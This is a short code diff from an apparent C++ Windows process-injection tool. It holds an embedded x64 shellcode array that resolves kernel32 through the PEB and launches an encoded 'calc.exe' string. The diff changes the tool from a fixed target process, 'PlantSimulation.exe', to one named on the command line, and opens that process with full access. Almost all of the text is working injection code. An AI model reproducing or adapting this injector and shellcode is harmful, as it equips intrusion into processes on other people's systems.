@@ -29,7 +29,7 @@ DWORD GetProcessIdByName(const wchar_t* processName){
     return -69;
 }
 
-int main(void){
+int wmain(int argc, wchar_t* argv[]){
     const char* shellcode = 
     "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
     "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
@@ -39,7 +39,13 @@ int main(void){
     "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
     "\x48\x83\xec\x20\x41\xff\xd6";
     HANDLE pHandle;
-    const wchar_t* processName = L"PlantSimulation.exe";
+
+    if(argc <= 1){
+        std::cout << "Usage : .\\inject.exe <process name>" << std::endl;
+        exit(-1);
+    }
+
+    const wchar_t* processName = argv[1];
     
     if(GetProcessIdByName(processName) != -69){
         if((pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(processName))) != INVALID_HANDLE_VALUE){
